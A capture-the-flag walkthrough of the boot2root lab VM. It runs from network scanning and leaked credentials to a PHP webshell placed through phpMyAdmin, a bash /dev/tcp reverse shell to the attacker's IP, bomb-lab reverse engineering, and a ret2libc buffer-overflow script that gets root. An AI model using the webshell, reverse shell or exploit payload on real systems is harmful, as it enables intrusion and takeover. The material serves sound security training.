# boot2root

### Second Writeup for Boot2Root Challenge

## Find the network IP

Let's run the command `ip addr` to get our IP

![My photo](https://i.imgur.com/kjLRDVN.png)

As you can see, `eth0` has the IP `10.37.129.4` with cidr /24, so our network IP address range is between `10.37.129.0` and `10.37.129.255`.

## Start with an Nmap Scan

Nmap is a networking tool help us discovering a network and show the running hosts and the opened ports, it also has other features like show the services that running in those ports and their versions, also can show the opereting system running and many features, but in my case, the host ip and the opened ports is all i wan't now.

Let's begin with a simple SYN scan with nmap using the -sS argument.

```bash
nmap -sS -O  10.37.129.0/24
```

###### -sS -O specify the syn scan (without complete full TCP handshake) and -O for showing the operating system running in the host

![My photo](https://i.imgur.com/B3QhstT.png)

Nmap finish the scan and it found 3 hosts are up and running in our network, the first is our physical host machine (the host that running the vms), the last one is our host (ip match `ip addr` output in first image), so the host that left is boot2root machine obviously, so let's save the ip and the opened ports because they're important for this method, currently nmap work is done here.

## Check the online services

Nmap found 6 open ports. We will start with the 80 and 443 ports, which are for HTTP and HTTPS.

### port 80

![My photo](https://i.imgur.com/L4Zj4t0.png)

Now we start to find something, but it's only a simple HTML page, let's look for directories, we will use the `dirb` tool to help us automate the process.

#### `dirb http://10.37.129.5`

![My photo](https://i.imgur.com/8MPJvQs.png)

nothing interested here, all directories return 403 which mean accessing is forbidden.<br />
Let's do the same for https port 443

![My photo](https://i.imgur.com/FakCvj0.png)

`dirb` scans every directory and sub-directories, the full output can be found <a href="https://gist.github.com/UBA-code/3f2b89944b164d48f6596c812db0b0d6">here</a>.<br/> Let's focus on the highlighted section, `dirb` found 5 directories, 2 of them inaccessible because they return a 403 code. The first directory `forum` looks interesting, let's take a look at it.

![alt text](https://i.imgur.com/Thgz7bU.png)
We found a forum that contains a few posts. Let's take a look at each to see if there is any sign that can help us. The first one is just a welcome message, I'll skip it for now, the second one looks interesting.

![alt text](https://i.imgur.com/WpV0oCQ.png)

Looks like some logs, and I notice there's some authentication failing there. Interesting, let's analyze more.

![alt text](https://i.imgur.com/vVACWFI.png)

We found a weird login attempt to user `!q\]Ej?*5K5cy*AJ`, 🤔 hmmm, this not seem like a username, i guess by mistake the user enter the password in username input, after the authentication failed a new session opened for a user named `lmezard`, let's testing if the theory is right. `dirb` show us there is 3 accessible directories, `/forum`, `/phpmyadmin` and `/webmail`, so the username and password we found can work in any of those, or at the boot2root login directly if we're lucky, let's start with the forum it self

![alt text](https://i.imgur.com/yuEc02g.png)
![alt text](https://i.imgur.com/HwxRqCp.png)

Guess what, the credentials are correct and we login to the forum, let's try same credentials in the `/webmail` page.

![alt text](https://i.imgur.com/QMM8ZI8.png)

didn't work, but i guess because it's not a valid email, let's look for the user email in the forum.

![alt text](https://i.imgur.com/CsJqLVN.png)

as you can see there is a different email, let's try it.

![alt text](https://i.imgur.com/PYxTV0i.png)

it worked!, and the very first email in the inbox has a subject with `DB Acess` 🤔.

![alt text](https://i.imgur.com/NMpFFdh.png)

it has a database credentials, let's try them in the `/phpmyadmin` directory that `dirb` tool found if you remember, so let's try the credentials we found `root/Fg-'kKXBj87E:aJ$`.

![alt text](https://i.imgur.com/U0BF1Rl.gif)

## Webshell

now we have access to the database with a root user, we can get a direct access to the shell of the user used to serve phpmyadmin, there is an approach named php webshell, we can with this trick run any command that user can run.

let's first check if the user can create files this query `select 'test' into outfile '/tmp/test'`

![alt text](https://i.imgur.com/0q4yQxn.png)

as you can see the user has write permission, now we need to find a place the user has permission to write because /tmp is not served by apache2, apache2 by default serve from `/var/www` folder.

![alt text](https://i.imgur.com/oP6Cqbl.png)

as you can see, the documentRoot is /var/www.

now let's run `dirb` on the /forum to see which directories are there.

<details>
<summary>show dirb result</summary>

```bash
┌──(kali㉿kali)-[~]
└─$ dirb https://10.37.129.5/forum -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Jul  3 17:18:08 2025
URL_BASE: https://10.37.129.5/forum/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://10.37.129.5/forum/ ----
+ https://10.37.129.5/forum/backup (CODE:403|SIZE:292)
+ https://10.37.129.5/forum/config (CODE:403|SIZE:292)
==> DIRECTORY: https://10.37.129.5/forum/images/
==> DIRECTORY: https://10.37.129.5/forum/includes/
+ https://10.37.129.5/forum/index (CODE:200|SIZE:4935)
+ https://10.37.129.5/forum/index.php (CODE:200|SIZE:4935)
==> DIRECTORY: https://10.37.129.5/forum/js/
==> DIRECTORY: https://10.37.129.5/forum/lang/
==> DIRECTORY: https://10.37.129.5/forum/modules/
==> DIRECTORY: https://10.37.129.5/forum/templates_c/
==> DIRECTORY: https://10.37.129.5/forum/themes/
==> DIRECTORY: https://10.37.129.5/forum/update/

-----------------
END_TIME: Thu Jul  3 17:18:16 2025
DOWNLOADED: 4612 - FOUND: 4

```

</details>

<br>

nice, now we have the directories inside `/forum` folder, we need to check each one if we can create a file there, i found that `/forum/templates_c` has write permission.

![alt text](https://i.imgur.com/zHvHqrh.png)

so now we know the directory where we can inject our webshell. let's do the same thing putting our shell `<?php system($_GET['cmd']); ?>` in the file `/var/www/forum/templates_c/shell.php`. that php code basically tell php to take a query string of name `cmd` and forward it's value to `system` function which run the command directly.

![alt text](https://i.imgur.com/GAscww4.png)

the file has been created, let' try to request the `/forum/templates_c/shell.php?cmd=id` and see if we can get anything.

![alt text](https://i.imgur.com/jgAfibV.png)

## Reverse shell

we got a response of `id` command, and as you can see apache2 running with `www-data` user, we can work from the browser and run a command every time, but let's try to get a full shell, we will use `nc` or netcat, it's a command-line networking tool can be use for various things (act like a client or server, transfer data, transfer files ...), we will use it as server in the attacker machine then connect to it with the target machine, then we will have a complete shell access from the terminal, let's try this out, we will use this command `bash -c 'bash -i >& /dev/tcp/10.37.129.4/4444 0>&1'
`, it's basically create a tcp connection between the two devices for reading and writing.

![alt text](https://i.imgur.com/GsXZajw.gif)

first we start `nc` and specify the port 4444 to listen, after that we use the command `bash -c 'bash -i >& /dev/tcp/10.37.129.5 0>&1'` we see before, but we need to encode it because the command has some special characters can't be used in url, so the final result will be `bash%20-c%20%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F10.37.129.4%2F4444%200>%261%27%0A`.

now we have direct shell access to the server, let's take a look at /home directory `ls -la`.

```bash
www-data@BornToSecHackMe:/home$ ls -la
ls -la
total 0
drwxrwx--x 1 www-data             root                  60 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 220 Jul  3 12:06 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
www-data@BornToSecHackMe:/home$
```

good there's multiple users and there is a directory named LOOKATME, let's take a look there.

```bash
www-data@BornToSecHackMe:/home/LOOKATME$ ls
ls
password
www-data@BornToSecHackMe:/home/LOOKATME$ cat password
cat password
lmezard:G!@M6f4Eatau{sF"
www-data@BornToSecHackMe:/home/LOOKATME$
```

## FTP

there is a `password` file contain `lmezard:G!@M6f4Eatau{sF"`, i've try them at ssh but didn't work, you remember `nmap` found an `ftp` service running at port `21`, let's try to connect with this credentials.

![alt text](https://i.imgur.com/CwqgNfw.png)

it worked, i found two files `README` and `fun`, let's download them locally and see if they contain anything can help us.

## The fun challenge

README

```bash
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

`fun` is a archive need to be extracted with `tar -xf fun`.

the folder contain a `.pcap` files, but the extension is wrong they are just a plain text and contain a c sytanx, the challenge is fix those files and compile them to print the password, i use another trick without compile it, first i found a main function contain that

```c
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```

i need now to search for each function and se the return value.

```c
char getme1() {

//file5
```

i found the first one, but there is no return and that's the trick, this file is must be `file5` and the return must be in the next file `file6`, let's search for `//file6`.

```c
	return 'I';

//file6
```

i found the return, this process will be repeated for each function in the main. and the final password is `Iheartpwnage`, and it's SHA-256 is `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

![alt text](https://i.imgur.com/5NWoirG.png)

it worked, let' go forward.

## Defuse the bomb.

```bash
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
laurie@BornToSecHackMe:~$
```

the challenge here is the famous bomb lab reverse engineering challenge, there is 6 phases and each phase need a unique password to unlock the next phase, let's first disassemble the binary and take a look at the code, we will use the `dogbolt.org` website for helping us disassemble the binary, it has multiple tools, one of them is `ghidra`, its a powerful tool for disassembling binaries.

![alt text](https://i.imgur.com/TM6ETL9.png)

as you can see, all you need is to upload the binary file and the website will take care of the rest, let's focus on `ghidra`, let's search `main` and see if we there is a main function

<details>
<summary>main function</summary>

```c
int main(int argc,char **argv)

{
  undefined4 uVar1;
  int in_stack_00000004;
  undefined4 *in_stack_00000008;

  if (in_stack_00000004 == 1) {
    infile = stdin;
  }
  else {
    if (in_stack_00000004 != 2) {
      printf("Usage: %s [<input_file>]\n",*in_stack_00000008);
                    // WARNING: Subroutine does not return
      exit(8);
    }
    infile = (_IO_FILE *)fopen((char *)in_stack_00000008[1],"r");
    if ((FILE *)infile == (FILE *)0x0) {
      printf("%s: Error: Couldn\'t open %s\n",*in_stack_00000008,in_stack_00000008[1]);
                    // WARNING: Subroutine does not return
      exit(8);
    }
  }
  initialize_bomb(argv);
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  uVar1 = read_line();
  phase_1(uVar1);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  uVar1 = read_line();
  phase_2(uVar1);
  phase_defused();
  printf("That\'s number 2.  Keep going!\n");
  uVar1 = read_line();
  phase_3(uVar1);
  phase_defused();
  printf("Halfway there!\n");
  uVar1 = read_line();
  phase_4(uVar1);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  uVar1 = read_line();
  phase_5(uVar1);
  phase_defused();
  printf("Good work!  On to the next...\n");
  uVar1 = read_line();
  phase_6(uVar1);
  phase_defused();
  return 0;
}
```

</details>

yes there's a main function, and now we have a clear idea of the main logic, each phase has a function, so let's start with the first one, i will search for phase_1.

### phase 1

```c
void phase_1(undefined4 param_1)

{
  int iVar1;

  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

> Like a knife through butter

all it do is compare the string we entered to `Public speaking is very easy.`, that's mean we need to enter the exact string. let's save it into file and pass it to the bomb binary so we don't type it every time.

### phase 2

```c
void phase_2(undefined4 param_1)

{
  int iVar1;
  int aiStack_20 [7];

  read_six_numbers(param_1,aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

the second phase has a read_six_numbers function that expect a string of this pattern `n n n n n n` while `n` represent a number. after the read_six_number, `aiStack_20` is the array that contain our number and it start at index 1, it check if the first number is not equal to 1, the bomb will explode, so the first number must be 1 and the second number is 2 if you see the hint in the README, in the loop there is a check, the next number in the array must be equal to current index times the previous number, so the array must be in this pattern, `[0, 1, {2 * 1 = 2}, {3 * 2 = 6}, {4 * 6 = 24}, {5 * 24 = 120}], {6 * 120 = 720}`, so the string must be equal to `1 2 6 24 120 720`.

### phase 3

<details>
<summary>phase_3 code</summary>

```c
void phase_3(char *param_1)

{
  int iVar1;
  char cVar2;
  undefined4 local_10;
  char local_9;
  int local_8;

  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

</details>

this phase is quit simple, `c n c` is expected as input, while `c` represent character and `n` a number, there's a switch to the first first number and contain a 0 to 9 cases check, so the first number must be between 0 and 9 and inside each case there is a check if the the last number is not equal to a number so the first and the last number is specified, and each case do the same process, so there is multiple answers to this phase, let's take the second case as the answer so our input will '1 b 214', we use `b` as second character because inside the case it set the `cVar2` to `b` and check before the return if the second character is equal to the `cVar2` value, and 214 as last numbe because `0xd6` is the hex of `214`. we use the second option exactly because this one is the one that it work with the final password

### phase 4

<details>
<summary>phase_4 code</summary>

```c
void phase_4(char *param_1)

{
  int iVar1;
  int local_8;

  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}
```

</details>

this phase require just a single number as input and must be greater than 0, than it pass the value into func4 function.

```c
int func4(int param_1)

{
  int iVar1;
  int iVar2;

  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}
```

`func4` is just a classic fibonacci function, but instead of starting from 0, we start from 1. in `phase_4` function end it check if the result is equal to `55`, so after checking each number, we found that that the new fibonacci logic return 55 when the entered number is `9`.

## phase_5

<details>
<summary>phase_5 code</summary>

```c
int __cdecl phase_5(_BYTE *a1)
{
  int i; // edx
  int result; // eax
  _BYTE v3[8]; // [esp+10h] [ebp-8h] BYREF

  if ( string_length(a1) != 6 )
    explode_bomb();
  for ( i = 0; i <= 5; ++i )
    v3[i] = array_123[a1[i] & 0xF];
  v3[6] = 0;
  result = strings_not_equal(v3, "giants");
  if ( result )
    explode_bomb();
  return result;
}
```

</details>

we will use now `hex-rays` disassemble because `ghidra` didn't help me so much here, in this phase the expected input is a 6 characters string, the challenge here is there's an array of characters already declared an we need a string `giants` at the end, we need to enter a characters that when we do a bitwise AND with `0xF` will return the index of the character in the array, so let's take `g` as example, the ascii value of `g` is `103`, and it's index in the array is `15`, so we need to find a character that when we take the ascii value and do `& 0xF` it will return `15`.

```c
_BYTE array_123[16] = { 105, 115, 114, 118, 101, 97, 119, 104, 111, 98, 112, 110, 117, 116, 102, 103 };

// array_123[16] =     "isrveawhobpnutfg"
```

each number represent an ascii character, so we will start with `g`, it's ascii value is `103`, and it's the last value in the array and it's index is 15, there is a hint of `o` character in the readme, 0 = 111 & 0xF = 15, so it's `g` in the array, after doing the same i found out the next character is `p`, `p` = `112` & 0xF = 0, and it's `i` in the array. at the end i find out that this exercise has multiple answers also,

`op['e' or 'u']km['a' or 'q']`

`opekmq` is is the one that work in the password, so this is the right one for this phase.

## phase 6

the challenge in phase 6 is there is a linked list contain numbers, and we need to sort it.

<details>
<summary>phase_6 code</summary>

```c
int __cdecl phase_6(char *s)
{
  int i; // edi
  int j; // ebx
  int k; // edi
  _DWORD *v4; // esi
  int m; // ebx
  int v6; // esi
  int n; // edi
  int v8; // eax
  int v9; // esi
  int ii; // edi
  int result; // eax
  int v12; // [esp+24h] [ebp-34h]
  _DWORD v13[6]; // [esp+28h] [ebp-30h]
  int v14[6]; // [esp+40h] [ebp-18h] BYREF

  read_six_numbers(s, (int)v14);
  for ( i = 0; i <= 5; ++i )
  {
    if ( (unsigned int)(v14[i] - 1) > 5 )
      explode_bomb();
    for ( j = i + 1; j <= 5; ++j )
    {
      if ( v14[i] == v14[j] )
        explode_bomb();
    }
  }
  for ( k = 0; k <= 5; ++k )
  {
    v4 = &node1;
    for ( m = 1; m < v14[k]; ++m )
      v4 = (_DWORD *)v4[2];
    v13[k] = v4;
  }
  v6 = v13[0];
  v12 = v13[0];
  for ( n = 1; n <= 5; ++n )
  {
    v8 = v13[n];
    *(_DWORD *)(v6 + 8) = v8;
    v6 = v8;
  }
  *(_DWORD *)(v8 + 8) = 0;
  v9 = v12;
  for ( ii = 0; ii <= 4; ++ii )
  {
    result = *(_DWORD *)v9;
    if ( *(_DWORD *)v9 < **(_DWORD **)(v9 + 8) )
      explode_bomb();
    v9 = *(_DWORD *)(v9 + 8);
  }
  return result;
}
```

</details>

the linked list is already declared in the binary, we need to sort it in descending order, the expected input is a string of numbers like `n n n n n n` where `n` is a number between 1 and 6, and each number must be unique, so the input must be like `1 2 3 4 5 6`, but in the reverse order, so the input will be `6 5 4 3 2 1`.

i fount out there is a trick, we will use `gdb` now, it's a powerful tool for debugging binaries, we will use it to see the each node in the linked list, if you read the phaese_6 code, you will notice there is a `node1` variable, let's take a look at it.

```bash
(gdb) print node1
$1 = 253
(gdb)
```

it's worked, now we can see the value of the first node, let's see the next one.

```bash
(gdb) print node2
$2 = 725
(gdb)
```

so we have idea now that each node has named depending on the place.

let's take a look at them all.

```bash
(gdb) print node1
$1 = 253
(gdb) print node2
$2 = 725
(gdb) print node3
$3 = 301
(gdb) print node4
$4 = 997
(gdb) print node5
$5 = 212
(gdb) print node6
$6 = 432
(gdb) print node7
No symbol "node7" in current context.
(gdb)
```

so now we have all the values of the nodes, let's sort them in descending order, so the final input will be `997 725 432 301 253 212`, and it's indices are `4 2 6 3 1 5`, so the final input will be `4 2 6 3 1 5`.

```bash
laurie@BornToSecHackMe:~$ ./bomb phases.txt
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
laurie@BornToSecHackMe:~$
```

we defused the bomb, now we can use the phases answers as password without the spaces, so the final password will be `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

if you notice we swap the `1` and `2` in the end of the password, this case is noted at the subject.

![alt text](https://i.imgur.com/9M7cIix.png)

## Turtle

after trying the password, it worked and in home directory of thor user, there's to files, `README` and `turtle`.

```bash
thor@BornToSecHackMe:~$ ls
README  turtle
thor@BornToSecHackMe:~$
```

turtle file contain instructions of a python library named turtle, so we need to convert those instructions into a valid python code and running it

![alt text](https://i.imgur.com/h0dMlhs.png)

after running it this what it paint, there is `L` `A` `S` `H` `S`, and it's `SLASH` we need to hash it into MD5 to use it as password of `zaz` as described at `README` file.

```bash
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$
```

after encrypting it, this is the hash `646da671ca01bb5d84dbb5fb2238dc8e`, we will use it to connect to `zaz` user.

## BOF exploitation

after connecting to `zaz` user, this is what it's home directory contain

```bash
zaz@BornToSecHackMe:~$ whoami
zaz
zaz@BornToSecHackMe:~$ ls -la
total 12
drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
drwxrwx--x 1 www-data root   60 Oct 13  2015 ..
-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
zaz@BornToSecHackMe:~$
```

there is a file with name `exploit_me`, look at the permissions, he has a `SUID` and it's belongs to root group, that's mean the file will be executed with the same permission as the owner has.

after disassemble the binary, this is the main function.

```c
bool main(int param_1,int param_2)

{
  char local_90 [140];

  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```

we can see clearly that this executable is vulnerable, it take argument and it copy it's value into a `140 byte` buffer, it use the strcpy which is not checking the length, we can exploit this program to get a shell of root by crashing the program with a buffer bigger than `140`.

```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*141')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
zaz@BornToSecHackMe:~$
```

as you can see we crash the program with enter a `141` input, to exploit this bug, after the payload there is a place named `EIP`, this place contain the address of the next instruction, we can control this address to run what we want, in this case we wanna get a shell, we will use a `ret2libc` technique instead of using a shellcode, first we need to find the address of the `system` function then the `exit` function, and finally the address of the `/bin/sh` string, we will use gdb to get those addresses.

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave
   0x08048437 <+67>:    ret
End of assembler dump.
(gdb) b *0x08048436
Breakpoint 1 at 0x8048436
(gdb) run test
Starting program: /home/zaz/exploit_me test
test

Breakpoint 1, 0x08048436 in main ()
(gdb) print system # print the address of system function
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit # print the address of exit function
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system, +9999999, "/bin/sh" # print the address of /bin/sh string
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb)
```

now we have the 3 important addresses, now we can use them to do the attack, i create a script that craft the payload and return it.

```py
import struct

PADDING = "A" * 140
SYSTEM_ADDR = struct.pack("<I", 0xB7E6B060)  # Address of system function
EXIT_ADDR = struct.pack("<I", 0xB7E5EBE0)  # Address of exit function
BIN_SH_ADDR = struct.pack("<I", 0xB7F8CC58)  # Address of "/bin/sh" string

payload = PADDING + SYSTEM_ADDR + EXIT_ADDR + BIN_SH_ADDR

print(payload)
```

after running the vulnerable binary with the exploit we've successfully got root shell

![alt text](https://i.imgur.com/LKCX5Z0.png)
